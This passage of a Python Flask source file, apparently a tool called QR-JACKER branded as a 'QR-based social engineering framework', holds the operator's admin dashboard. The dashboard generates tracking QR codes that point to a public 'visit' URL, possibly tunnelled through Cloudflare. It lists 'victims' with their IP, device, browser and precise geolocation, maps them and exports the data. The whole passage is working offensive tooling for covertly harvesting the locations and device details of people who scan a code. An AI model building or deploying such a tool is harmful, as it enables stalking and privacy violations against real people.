  /* Empty State */
  .empty-state {
    text-align: center;
    padding: 80px 20px;
    color: var(--text-muted);
    grid-column: 1 / -1;
  }
  
  .empty-state-icon {
    font-size: 64px;
    margin-bottom: 20px;
    opacity: 0.3;
  }
  
  .empty-state-text {
    font-size: 16px;
    text-transform: uppercase;
    letter-spacing: 2px;
  }
  
  /* Scrollbar */
  ::-webkit-scrollbar {
    width: 12px;
    height: 12px;
  }
  
  ::-webkit-scrollbar-track {
    background: var(--bg-primary);
  }
  
  ::-webkit-scrollbar-thumb {
    background: var(--border-bright);
    border-radius: 6px;
    border: 2px solid var(--bg-primary);
  }
  
  ::-webkit-scrollbar-thumb:hover {
    background: var(--accent-red);
  }
  
  /* Notification */
  .notification {
    position: fixed;
    top: 20px;
    right: 20px;
    background: var(--bg-secondary);
    border: 2px solid var(--accent-red);
    border-radius: 8px;
    padding: 16px 24px;
    box-shadow: 0 8px 30px var(--accent-red-glow);
    z-index: 10001;
    display: none;
    animation: slideInNotif 0.3s ease;
  }
  
  @keyframes slideInNotif {
    from { opacity: 0; transform: translateX(100px); }
    to { opacity: 1; transform: translateX(0); }
  }
  
  .notification.active {
    display: block;
  }
  
  .notification-text {
    font-size: 14px;
    font-weight: 600;
    color: var(--text-primary);
  }
</style>
</head>
<body>
  <div class="container">
    <!-- Header -->
    <div class="header">
      <div class="header-left">
        <div class="logo-container">
          <img id="logo-img" src="/static/logo.png" alt="Logo" style="display:none" onerror="this.style.display='none';document.querySelector('.logo-placeholder').style.display='block'">
          <div class="logo-placeholder">QJ</div>
        </div>
        <div class="header-title">
          <h1>QR-JACKER</h1>
          <div class="subtitle">Advanced Red Team Console v2.0</div>
        </div>
      </div>
      <div class="header-right">
        <div class="status-indicator">
          <div class="pulse-dot"></div>
          <div class="status-text">System Active</div>
        </div>
      </div>
    </div>
    
    <!-- Content -->
    <div class="content">
      <!-- Stats Grid -->
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-label">Total Victims</div>
          <div class="stat-value" id="stat-total">0</div>
          <div class="stat-change" id="stat-total-change"></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Unique IPs</div>
          <div class="stat-value" id="stat-ips">0</div>
          <div class="stat-change" id="stat-ips-change"></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Geolocated</div>
          <div class="stat-value" id="stat-geo">0</div>
          <div class="stat-change" id="stat-geo-change"></div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Success Rate</div>
          <div class="stat-value" id="stat-rate">0%</div>
          <div class="stat-change" id="stat-rate-change"></div>
        </div>
      </div>
      
      <!-- Action Bar -->
      <div class="action-bar">
        <button class="primary" id="btn-generate"><span>Generate QR Code</span></button>
        <button id="btn-refresh"><span>Refresh Data</span></button>
        <button id="btn-export"><span>Export Logs</span></button>
        <button class="danger" id="btn-clear"><span>Clear Database</span></button>
      </div>
      
      <!-- QR Display -->
      <div id="qrbox"></div>
      
      <!-- Section Header -->
      <div class="section-header">
        <h2>Active Victims</h2>
        <div class="filter-group">
          <button class="filter-btn active" data-filter="all"><span>All</span></button>
          <button class="filter-btn" data-filter="geo"><span>Geolocated</span></button>
          <button class="filter-btn" data-filter="mobile"><span>Mobile</span></button>
          <button class="filter-btn" data-filter="desktop"><span>Desktop</span></button>
        </div>
      </div>
      
      <!-- Victims Grid -->
      <div id="grid"></div>
    </div>
  </div>
  
  <!-- Context Menu -->
  <div class="context-menu" id="contextMenu">
    <div class="context-menu-item" data-action="location">
      <div class="context-menu-icon">▸</div>
      <div>View Location</div>
    </div>
    <div class="context-menu-item" data-action="specs">
      <div class="context-menu-icon">▸</div>
      <div>Device Specs</div>
    </div>
    <div class="context-menu-item" data-action="browser">
      <div class="context-menu-icon">▸</div>
      <div>Browser Info</div>
    </div>
    <div class="context-menu-divider"></div>
    <div class="context-menu-item" data-action="copy-ip">
      <div class="context-menu-icon">▸</div>
      <div>Copy IP</div>
    </div>
    <div class="context-menu-item" data-action="copy-session">
      <div class="context-menu-icon">▸</div>
      <div>Copy Session ID</div>
    </div>
    <div class="context-menu-divider"></div>
    <div class="context-menu-item" data-action="export-single">
      <div class="context-menu-icon">▸</div>
      <div>Export Data</div>
    </div>
    <div class="context-menu-item" data-action="delete">
      <div class="context-menu-icon">▸</div>
      <div>Delete Entry</div>
    </div>
  </div>
  
  <!-- Modal -->
  <div class="modal-overlay" id="modalOverlay">
    <div class="modal">
      <div class="modal-header">
        <div class="modal-title" id="modalTitle">Details</div>
        <button class="modal-close" id="modalClose">×</button>
      </div>
      <div class="modal-body" id="modalBody"></div>
    </div>
  </div>
  
  <!-- Notification -->
  <div class="notification" id="notification">
    <div class="notification-text" id="notificationText"></div>
  </div>

<script>
// Global state
let allVictims = [];
let currentFilter = 'all';
let selectedVictim = null;
let previousStats = { total: 0, ips: 0, geo: 0 };

// Helper functions
async function jfetch(u, opts) { 
  const r = await fetch(u, opts); 
  return r.json(); 
}

function showNotification(text, duration = 3000) {
  const notif = document.getElementById('notification');
  const notifText = document.getElementById('notificationText');
  notifText.textContent = text;
  notif.classList.add('active');
  setTimeout(() => notif.classList.remove('active'), duration);
}

function getDeviceInfo(ua) {
  const l = ua.toLowerCase();
  if (l.includes('android')) return { icon: '/static/img/android.png', name: 'Android', type: 'mobile', fallback: 'A' };
  if (l.includes('iphone') || l.includes('ipad')) return { icon: '/static/img/iphone.png', name: 'iOS', type: 'mobile', fallback: 'i' };
  if (l.includes('mac')) return { icon: '/static/img/mac.png', name: 'macOS', type: 'desktop', fallback: 'M' };
  if (l.includes('win')) return { icon: '/static/img/win.png', name: 'Windows', type: 'desktop', fallback: 'W' };
  if (l.includes('linux')) return { icon: '/static/img/linux.png', name: 'Linux', type: 'desktop', fallback: 'L' };
  return { icon: '/static/img/unknown.png', name: 'Unknown', type: 'unknown', fallback: '?' };
}

function formatTimestamp(ts) {
  const date = new Date(ts);
  return date.toLocaleString('en-US', { 
    month: 'short', 
    day: 'numeric', 
    hour: '2-digit', 
    minute: '2-digit' 
  });
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showNotification('Copied to clipboard');
  }).catch(() => {
    showNotification('Failed to copy');
  });
}

// Render functions
async function renderGrid() {
  try {
    const arr = await jfetch('/admin/logs');
    allVictims = arr;
    
    // Update stats
    const uniqueIps = new Set(arr.map(e => e.ip)).size;
    const withGeo = arr.filter(e => e.payload && e.payload.coords).length;
    const successRate = arr.length > 0 ? Math.round((withGeo / arr.length) * 100) : 0;
    
    // Update stat values with change indicators
    updateStat('stat-total', arr.length, previousStats.total);
    updateStat('stat-ips', uniqueIps, previousStats.ips);
    updateStat('stat-geo', withGeo, previousStats.geo);
    document.getElementById('stat-rate').textContent = successRate + '%';
    
    previousStats = { total: arr.length, ips: uniqueIps, geo: withGeo };
    
    const grid = document.getElementById('grid');
    
    // Filter victims
    let filtered = arr;
    if (currentFilter === 'geo') {
      filtered = arr.filter(e => e.payload && e.payload.coords);
    } else if (currentFilter === 'mobile') {
      filtered = arr.filter(e => {
        const device = getDeviceInfo(e.payload?.userAgent || e.ua || '');
        return device.type === 'mobile';
      });
    } else if (currentFilter === 'desktop') {
      filtered = arr.filter(e => {
        const device = getDeviceInfo(e.payload?.userAgent || e.ua || '');
        return device.type === 'desktop';
      });
    }
    
    grid.innerHTML = '';
    if (!Array.isArray(filtered) || filtered.length === 0) {
      grid.innerHTML = `<div class="empty-state">
        <div class="empty-state-icon">◇</div>
        <div class="empty-state-text">No victims matching filter</div>
      </div>`;
      return;
    }
    
    for (const e of filtered) {
      const payload = e.payload || {};
      const ua = payload.userAgent || e.ua || '';
      const device = getDeviceInfo(ua);
      
      const tile = document.createElement('div');
      tile.className = 'tile';
      tile.dataset.victimId = e.id;
      
      let badges = '';
      if (payload.coords) {
        badges += `<span class="badge geo">GEOLOCATED</span>`;
      }
      if (payload.platform) {
        badges += `<span class="badge">${payload.platform}</span>`;
      }
      
      tile.innerHTML = `
        <div class="tile-content">
          <div class="tile-header">
            <div class="device-icon-wrapper">
              <img src="${device.icon}" class="device-icon" alt="${device.name}" 
                   onerror="this.outerHTML='<div class=\\'device-fallback\\'>${device.fallback}</div>'">
            </div>
            <div class="tile-header-info">
              <div class="session-id">${e.session}</div>
              <div class="device-name">${device.name}</div>
            </div>
          </div>
          <div class="tile-details">
            <div class="detail-row">
              <span class="detail-label">IP Address</span>
              <span class="detail-value highlight">${e.ip}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Timestamp</span>
              <span class="detail-value">${formatTimestamp(e.time)}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Screen</span>
              <span class="detail-value">${payload.screen ? `${payload.screen.w}x${payload.screen.h}` : 'N/A'}</span>
            </div>
            ${payload.timeZone ? `<div class="detail-row">
              <span class="detail-label">Timezone</span>
              <span class="detail-value">${payload.timeZone}</span>
            </div>` : ''}
          </div>
          ${badges ? `<div class="tile-badges">${badges}</div>` : ''}
        </div>
      `;
      
      // Right-click context menu
      tile.addEventListener('contextmenu', (ev) => {
        ev.preventDefault();
        selectedVictim = e;
        showContextMenu(ev.clientX, ev.clientY);
      });
      
      // Left-click to view full details
      tile.addEventListener('click', () => {
        showVictimDetails(e);
      });
      
      grid.appendChild(tile);
    }
  } catch (err) {
    console.error(err);
    document.getElementById('grid').innerHTML = '<div class="empty-state"><div class="empty-state-icon">✕</div><div class="empty-state-text">Error loading data</div></div>';
  }
}

function updateStat(id, newVal, oldVal) {
  const elem = document.getElementById(id);
  const changeElem = document.getElementById(id + '-change');
  elem.textContent = newVal;
  
  if (newVal > oldVal && changeElem) {
    const diff = newVal - oldVal;
    changeElem.textContent = `+${diff} new`;
    changeElem.style.color = 'var(--success)';
  }
}

function showContextMenu(x, y) {
  const menu = document.getElementById('contextMenu');
  menu.style.left = x + 'px';
  menu.style.top = y + 'px';
  menu.classList.add('active');
}

function hideContextMenu() {
  document.getElementById('contextMenu').classList.remove('active');
}

function showVictimDetails(victim) {
  const modal = document.getElementById('modalOverlay');
  const modalTitle = document.getElementById('modalTitle');
  const modalBody = document.getElementById('modalBody');
  
  modalTitle.textContent = `Victim ${victim.session}`;
  
  const payload = victim.payload || {};
  
  let html = '<div class="info-grid">';
  
  // Session Info
  html += `<div class="info-section">
    <div class="info-section-title">Session Information</div>
    <div class="info-row">
      <div class="info-label">Session ID</div>
      <div class="info-value accent">${victim.session}</div>
    </div>
    <div class="info-row">
      <div class="info-label">IP Address</div>
      <div class="info-value accent">${victim.ip}</div>
    </div>
    <div class="info-row">
      <div class="info-label">Timestamp</div>
      <div class="info-value">${new Date(victim.time).toLocaleString()}</div>
    </div>
  </div>`;
  
  // Device Info
  html += `<div class="info-section">
    <div class="info-section-title">Device Specifications</div>
    <div class="info-row">
      <div class="info-label">Platform</div>
      <div class="info-value">${payload.platform || 'N/A'}</div>
    </div>
    <div class="info-row">
      <div class="info-label">Screen Resolution</div>
      <div class="info-value">${payload.screen ? `${payload.screen.w} × ${payload.screen.h}` : 'N/A'}</div>
    </div>
    <div class="info-row">
      <div class="info-label">User Agent</div>
      <div class="info-value">${victim.ua || 'N/A'}</div>
    </div>
  </div>`;
  
  // Browser Info
  html += `<div class="info-section">
    <div class="info-section-title">Browser Information</div>
    <div class="info-row">
      <div class="info-label">Languages</div>
      <div class="info-value">${payload.languages ? payload.languages.join(', ') : 'N/A'}</div>
    </div>
    <div class="info-row">
      <div class="info-label">Timezone</div>
      <div class="info-value">${payload.timeZone || 'N/A'}</div>
    </div>
    <div class="info-row">
      <div class="info-label">Cookies Enabled</div>
      <div class="info-value">${payload.cookieEnabled !== undefined ? (payload.cookieEnabled ? 'Yes' : 'No') : 'N/A'}</div>
    </div>
  </div>`;
  
  // Geolocation
  if (payload.coords) {
    html += `<div class="info-section">
      <div class="info-section-title">Geolocation Data</div>
      <div class="info-row">
        <div class="info-label">Latitude</div>
        <div class="info-value accent">${payload.coords.lat}</div>
      </div>
      <div class="info-row">
        <div class="info-label">Longitude</div>
        <div class="info-value accent">${payload.coords.lon}</div>
      </div>
      <div class="info-row">
        <div class="info-label">Accuracy</div>
        <div class="info-value">±${payload.coords.accuracy}m</div>
      </div>
      <div class="info-row">
        <div class="info-label">Google Maps</div>
        <div class="info-value"><a href="https://www.google.com/maps?q=${payload.coords.lat},${payload.coords.lon}" target="_blank" style="color:var(--accent-red)">View Location</a></div>
      </div>
    </div>`;
  }
  
  html += '</div>';
  modalBody.innerHTML = html;
  modal.classList.add('active');
}

function hideModal() {
  document.getElementById('modalOverlay').classList.remove('active');
}

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
  // Try to load custom logo
  const logoImg = document.getElementById('logo-img');
  const img = new Image();
  img.onload = () => {
    logoImg.style.display = 'block';
    document.querySelector('.logo-placeholder').style.display = 'none';
  };
  img.onerror = () => {
    logoImg.style.display = 'none';
    document.querySelector('.logo-placeholder').style.display = 'block';
  };
  img.src = '/static/logo.png';
  
  // Buttons
  document.getElementById('btn-refresh').addEventListener('click', () => {
    renderGrid();
    showNotification('Data refreshed');
  });
  
  document.getElementById('btn-clear').addEventListener('click', async () => {
    if (!confirm('WARNING: This will permanently delete all victim data. Continue?')) return;
    await fetch('/admin/clear_logs', { method: 'POST' });
    renderGrid();
    showNotification('Database cleared');
  });
  
  document.getElementById('btn-generate').addEventListener('click', async () => {
    try {
      const custom = prompt("Enter Cloudflare/public URL (leave blank for default):", "");
      const r = await fetch('/admin/generate?custom_url=' + encodeURIComponent(custom || ""));
      const j = await r.json();
      
      const qrbox = document.getElementById('qrbox');
      qrbox.innerHTML = `<div class="qr-display">
        <img src="${j.qr}" width="300" alt="QR Code"/>
        <div class="qr-info">
          <div class="qr-info-item">
            <div class="qr-info-label">Session ID</div>
            <div class="qr-info-value">${j.session}</div>
          </div>
          <div class="qr-info-item">
            <div class="qr-info-label">Visit URL</div>
            <div class="qr-info-value">${j.visit_url}</div>
          </div>
          <div class="qr-info-item">
            <div class="qr-info-label">Saved Location</div>
            <div class="qr-info-value">${j.saved_file}</div>
          </div>
        </div>
      </div>`;
      showNotification('QR Code generated successfully');
    } catch (e) {
      showNotification('Generation failed: ' + e);
    }
  });
  
  document.getElementById('btn-export').addEventListener('click', () => {
    const dataStr = JSON.stringify(allVictims, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `victims_${Date.now()}.json`;
    link.click();
    showNotification('Export complete');
  });
  
  // Filter buttons
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentFilter = btn.dataset.filter;
      renderGrid();
    });
  });
  
  // Context menu items
  document.querySelectorAll('.context-menu-item').forEach(item => {
    item.addEventListener('click', () => {
      const action = item.dataset.action;
      handleContextAction(action);
      hideContextMenu();
    });
  });
  
  // Hide context menu on click outside
  document.addEventListener('click', hideContextMenu);
  
  // Modal close
  document.getElementById('modalClose').addEventListener('click', hideModal);
  document.getElementById('modalOverlay').addEventListener('click', (e) => {
    if (e.target.id === 'modalOverlay') hideModal();
  });
  
  // Initial render
  renderGrid();
  setInterval(renderGrid, 30000);
});

function handleContextAction(action) {
  if (!selectedVictim) return;
  
  const payload = selectedVictim.payload || {};
  
  switch(action) {
    case 'location':
      if (payload.coords) {
        window.open(`https://www.google.com/maps?q=${payload.coords.lat},${payload.coords.lon}`, '_blank');
      } else {
        showNotification('No geolocation data available');
      }
      break;
    case 'specs':
      showVictimDetails(selectedVictim);
      break;
    case 'browser':
      showVictimDetails(selectedVictim);
      break;
    case 'copy-ip':
      copyToClipboard(selectedVictim.ip);
      break;
    case 'copy-session':
      copyToClipboard(selectedVictim.session);
      break;
    case 'export-single':
      const dataStr = JSON.stringify(selectedVictim, null, 2);
      const dataBlob = new Blob([dataStr], { type: 'application/json' });
      const url = URL.createObjectURL(dataBlob);
      const link = document.createElement('a');
      link.href = url;
      link.download = `victim_${selectedVictim.session}.json`;
      link.click();
      showNotification('Victim data exported');
      break;
    case 'delete':
      showNotification('Delete functionality not implemented in demo');
      break;
  }
}
</script>
</body>
</html>
"""

@admin_app.route("/")
@requires_auth
def admin_index():
    if request.args.get('loaded') != '1':
        return admin_loading_screen()
    return render_template_string(ADMIN_INDEX_HTML)

@admin_app.route("/dashboard")
@requires_auth
def admin_dashboard():
    return render_template_string(ADMIN_INDEX_HTML)

@admin_app.route("/admin/generate")
@requires_auth
def admin_generate():
    import urllib.parse
    session_id = str(int(time.time()*1000))
    custom_url = request.args.get("custom_url", "").strip()
    if custom_url:
        custom_url = urllib.parse.unquote(custom_url)
        if not custom_url.startswith("http://") and not custom_url.startswith("https://"):
            custom_url = "https://" + custom_url
        visit_base = custom_url.rstrip("/")
        print("[+] Using custom URL:", visit_base)
    else:
        if CLOUDFLARE_URL:
            visit_base = CLOUDFLARE_URL.rstrip("/")
            print("[+] Using CLOUDFLARE_URL env var:", visit_base)
        else:
            visit_base = f"http://{PUBLIC_HOST}:{PUBLIC_PORT}"
            print("[!] Using fallback local URL:", visit_base)

    visit_url = f"{visit_base}/visit?s={session_id}"
    print("[QR] visit_url:", visit_url)

    qr_obj = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H)
    qr_obj.add_data(visit_url)
    qr_obj.make(fit=True)
    img = qr_obj.make_image(fill_color="black", back_color="white")

    filename = f"{session_id}.png"
    filepath = os.path.join(QR_DIR, filename)
    img.save(filepath)

    buf = io.BytesIO(); img.save(buf, format="PNG")
    b64 = base64.b64encode(buf.getvalue()).decode("ascii")
    datauri = "data:image/png;base64," + b64

    return jsonify({"qr": datauri, "session": session_id, "saved_file": filepath, "visit_url": visit_url})

@admin_app.route("/admin/logs")
@requires_auth
def admin_logs():
    return jsonify(read_logs())

@admin_app.route("/admin/clear_logs", methods=["POST"])
@requires_auth
def admin_clear_logs():
    clear_logs(); return jsonify({"cleared": True})

@admin_app.route("/static/img/<path:filename>")
def static_img(filename):
    return send_from_directory(os.path.join(os.getcwd(), "static", "img"), filename)

def run_public():
    print(f"[+] public app -> http://{PUBLIC_HOST}:{PUBLIC_PORT}")
    public_app.run(host=PUBLIC_HOST, port=PUBLIC_PORT, debug=False, threaded=True)

def run_admin():
    print(f"[+] admin app  -> http://{ADMIN_HOST}:{ADMIN_PORT} (LOCAL ONLY)")
    admin_app.run(host=ADMIN_HOST, port=ADMIN_PORT, debug=False, threaded=True)

if __name__ == "__main__":
    banner = """
\033[91m
    ██████╗ ██████╗       ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
   ██╔═══██╗██╔══██╗      ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
   ██║   ██║██████╔╝█████╗██║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██║▄▄ ██║██╔══██╗╚════╝██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ╚██████╔╝██║  ██║      ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
    ╚══▀▀═╝ ╚═╝  ╚═╝      ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                       
        \033[97mAdvanced Red Team Reconnaissance Console v2.0\033[91m
        ═══════════════════════════════════════════════════════
        
        \033[97mDeveloper  : \033[91m@ethicalphoenix\033[97m
        Purpose    : \033[91mQR-Based Social Engineering Framework\033[97m
        Platform   : \033[91mRed Team Operations\033[97m
        
        \033[91m═══════════════════════════════════════════════════════\033[0m
    """
    print(banner)
    
    init_db()
    t1 = threading.Thread(target=run_public, daemon=True)
    t2 = threading.Thread(target=run_admin, daemon=True)
    t1.start(); t2.start()
    print("\033[92m[+]\033[0m Public App  : \033[96mhttp://{}:{}\033[0m".format(PUBLIC_HOST, PUBLIC_PORT))
    print("\033[92m[+]\033[0m Admin Panel : \033[96mhttp://{}:{}\033[0m \033[93m(LOCAL ONLY)\033[0m".format(ADMIN_HOST, ADMIN_PORT))
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[91m[!]\033[0m Shutting down... Bye!\033[0m")
